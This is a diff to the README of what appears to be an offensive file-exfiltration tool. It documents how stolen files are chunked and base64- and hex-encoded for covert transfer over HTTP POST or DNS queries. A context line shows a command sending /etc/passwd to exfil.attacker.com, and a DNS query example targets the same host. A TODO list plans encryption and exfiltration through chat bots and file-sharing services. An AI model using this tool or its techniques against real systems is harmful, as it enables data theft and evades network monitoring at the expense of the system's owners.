@@ -71,58 +71,93 @@ runner exfil dns -f /etc/passwd -d exfil.attacker.com --delay 800 -p tcp -n 8.8.
 
 ## Base64 Encoding Structure
 
-### HTTP Payload Structure
+### Node Structure
 
-The HTTP exfiltration uses a nested encoding scheme:
+All exfiltrated data is organized into a hierarchical node structure consisting of two primary node types:
 
-1. **File Content Encoding:**
-   - Original file content → Base64 encode → Hex encode → Result string
+#### Root Node (Type: 'r')
+The root node contains metadata about the file being exfiltrated. Each root node has the following format:
 
-2. **Chunk Structure:**
-   ```
-   <filename>:<chunk_index>:<encoded_content>
-   ```
-   - Last chunk is marked with `:end` suffix
-
-3. **Chunk Encoding:**
-   - Each chunk string → Base64 encode → Hex encode
-   - Final payload sent in POST body as plain text
-
-**Decoding Process (Receiver Side):**
 ```
-Received chunk → Hex decode → Base64 decode → Parse "filename:index:content"
-→ Extract content → Hex decode → Base64 decode → Original file data
+r:<filename>:<file_identifier>
 ```
 
-### DNS Payload Structure
+Where:
+- **r** - Node type identifier (always 'r' for root nodes)
+- **filename** - The original filename of the file being exfiltrated
+- **file_identifier** - A unique 4-byte random hex-encoded identifier that links all chunks of a file together during reconstruction (e.g., `a1b2c3d4`)
 
-The DNS exfiltration uses a DNS-safe encoding optimized for domain name constraints:
-
-1. **Chunk Size Calculation:**
-   - Computes optimal chunk size based on:
-     - Domain name max length: 255 characters
-     - DNS label max length: 63 characters
-     - Base64 encoding ratio: 4/3 expansion
-
-2. **Payload Structure:**
-   ```
-   <filename>:<chunk_index>:<hex(base64(file_chunk))>
-   ```
-   - Last chunk includes `:end` marker
-
-3. **DNS Query Format:**
-   ```
-   <hex(base64(payload_chunk))>.<destination_domain>
-   ```
-   - Payload is split into DNS-safe labels (dots separate labels)
-   - Each label respects 63-character limit
-   - Full domain respects 255-character limit
-
-**Decoding Process (DNS Server Side):**
+**Example:**
 ```
-DNS query subdomain → Extract labels → Hex decode → Base64 decode
-→ Parse "filename:index:content" → Hex decode → Base64 decode → Original file data
+r:secrets.txt:a1b2c3d4
 ```
+
+#### File Chunk Nodes (Type: 'f' or 'e')
+File chunk nodes contain portions of the exfiltrated file. Each chunk node has the following format:
+
+```
+f:<root_identifier>:<chunk_index>:<hex_encoded_data>
+e:<root_identifier>:<chunk_index>:<hex_encoded_data>
+```
+
+Where:
+- **f** - Node type identifier for regular file chunks
+- **e** - Node type identifier for the final (end) chunk that marks the file boundary
+- **root_identifier** - The same 4-byte hex identifier from the root node (e.g., `a1b2c3d4`)
+- **chunk_index** - Sequential zero-based chunk index within the file (in hexadecimal)
+- **hex_encoded_data** - The file data encoded as hexadecimal
+
+**Examples:**
+```
+f:a1b2c3d4:0:48656c6c6f20576f726c64...    (regular chunk)
+e:a1b2c3d4:A:476f6f6462796521...            (final chunk)
+```
+
+### Encoding Pipeline
+
+The runner tool applies a multi-stage encoding pipeline to ensure data is safely transmitted over constrained channels (HTTP or DNS):
+
+#### Stage 1: Node Serialization
+The file is first split into chunks and organized into nodes (root node followed by file chunk nodes). Each node is serialized to a colon-delimited string representation:
+
+```
+[NodeType]:[Metadata]:[Data]
+```
+
+#### Stage 2: Base64 Encoding
+The serialized node string is encoded using standard Base64 (RFC 4648), expanding the data by approximately 33%:
+
+```
+Input:  r:secrets.txt:a1b2c3d4
+Output: cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
+```
+
+#### Stage 3: Hex Encoding
+The Base64 output is then hex-encoded, converting each Base64 character to its hexadecimal ASCII representation, creating a fully alphanumeric payload:
+
+```
+Input:  cjpzZWNyZXRzLnR4dDphMWIyYzNkNA==
+Output: 636a3078656372657465732e7478743a613162326333643430
+```
+
+#### Stage 4: Transport-Specific Formatting
+Depending on the exfiltration method, the encoded data is formatted differently:
+
+**For HTTP Exfiltration:**
+- Encoded chunks are transmitted directly in the HTTP POST body
+- Multiple chunks are sent in separate HTTP POST requests
+- Each request contains one complete encoded chunk
+
+**For DNS Exfiltration:**
+- Encoded chunks are split into DNS-safe labels (max 63 characters per label)
+- Labels are joined with dots (.) to form valid DNS domain names
+- Each label becomes a subdomain in DNS TXT queries
+- Example: `636a3078.656372657465.732e7478.742e613162323333643430.exfil.attacker.com`
+
+This multi-stage encoding ensures that:
+1. Binary file data is safely converted to text
+2. Metadata is preserved for file reconstruction
+3. Payload fits within protocol constraints (DNS label length, HTTP content types)
 
 ## Installation
 
@@ -171,6 +206,8 @@ runner exfil http \
 ## TODO List
 
 ### High Priority
+- [x] **Payload chunks identification** - Implement IDs for each payload chunk for better tracking
+- [ ] **Add error handling** - Robust error handling for file I/O and network operations
 - [ ] **Add Compression Options** - Implement gzip/zlib compression before encoding to reduce payload size
 - [ ] **Add Encryption Options** - Implement AES/ChaCha20 encryption for payload confidentiality
 - [ ] **Add Logging Options** - Structured logging for operational tracking and debugging
@@ -197,6 +234,7 @@ runner exfil http \
 - [ ] Add exfiltration via social media platforms (Discord, Telegram bots)
 - [ ] Add exfiltration via file sharing services (Dropbox, Google Drive)
 - [ ] Implement Zero-Copy techniques
+- [ ] Implement intelligent warning based on domain length and chunk size (The bigger the domain name, the smaller the chunk size, and this is not currently indicated to the user)
  
 ## Security Considerations
 
